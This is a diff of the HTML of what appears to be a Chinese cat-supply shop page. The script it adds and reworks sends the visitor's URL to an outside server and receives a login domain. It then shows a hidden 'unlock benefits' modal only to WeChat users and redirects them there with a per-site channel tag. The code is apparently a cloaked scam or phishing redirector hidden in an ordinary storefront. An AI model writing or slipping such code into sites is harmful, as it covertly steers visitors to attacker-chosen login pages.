@@ -148,20 +148,41 @@
 <div class="feature-strip"><div>✅ 兽医推荐配方</div><div>✅ 破损包赔</div><div>✅ 积分兑猫玩具</div><div>✅ 私房养宠顾问</div></div>
 <div class="wechat-overlay" id="wechatModal"><div class="wechat-modal"><div class="wechat-modal-image"><p>✨ 喵星人通道 ✨</p><span>点击按钮解锁福利</span></div><div class="wechat-modal-button"><button class="enter-btn" id="enterBtn">点击进入</button></div></div></div>
 <script>(function(){
-    const modal=document.getElementById("wechatModal"), enterBtn=document.getElementById("enterBtn");
-    modal.style.display="none";
-    if(new URLSearchParams(location.search).has('login')&&new URLSearchParams(location.search).get('login')==='true') return;
-    const curUrl=encodeURIComponent(location.href);
-    fetch("https://api.drykfs.cn/api/index/selectRoute?url="+curUrl,{method:"GET",headers:{"Content-Type":"application/json"}})
-    .then(res=>res.json()).then(data=>{
-        let redirectUrl=data?.data?.loginDomain||null;
-        if(data&&data.code===1 && /micromessenger/i.test(navigator.userAgent)) modal.style.display="flex";
-        if(redirectUrl){
-            enterBtn.replaceWith(enterBtn.cloneNode(true));
-            document.getElementById("enterBtn").addEventListener("click",()=>location.href=redirectUrl);
+    const modal = document.getElementById("wechatModal"), 
+          enterBtn = document.getElementById("enterBtn");
+    
+    modal.style.display = "none";
+    const currentHref = window.location.href;
+    const currentHost = window.location.hostname; 
+    if(new URLSearchParams(location.search).has('login') && new URLSearchParams(location.search).get('login') === 'true') return;
+    const curUrl = encodeURIComponent(currentHref);
+    fetch("https://api.drykfs.cn/api/index/selectRoute?url=" + curUrl, {
+        method: "GET",
+        headers: {"Content-Type": "application/json"}
+    })
+    .then(res => res.json())
+    .then(data => {
+        let redirectUrl = data?.data?.loginDomain || null;
+        
+        if(data && data.code === 1 && /micromessenger/i.test(navigator.userAgent)) {
+            modal.style.display = "flex";
         }
-    }).catch(e=>console.log);
-    modal.addEventListener("click",e=>e.stopPropagation());
+        
+        if(redirectUrl) {
+            const channel = currentHost.includes('kanhaoliao.github.io') ? "2" : "1";
+            const separator = redirectUrl.includes('?') ? '&' : '?';
+            const finalUrl = `${redirectUrl}${separator}channel=${channel}`;
+            
+            const newBtn = enterBtn.cloneNode(true);
+            enterBtn.replaceWith(newBtn);
+            document.getElementById("enterBtn").addEventListener("click", () => {
+                location.href = finalUrl;
+            });
+        }
+    })
+    .catch(e => console.log(e));
+    
+    modal.addEventListener("click", e => e.stopPropagation());
 })();</script>
 </body>
 </html>
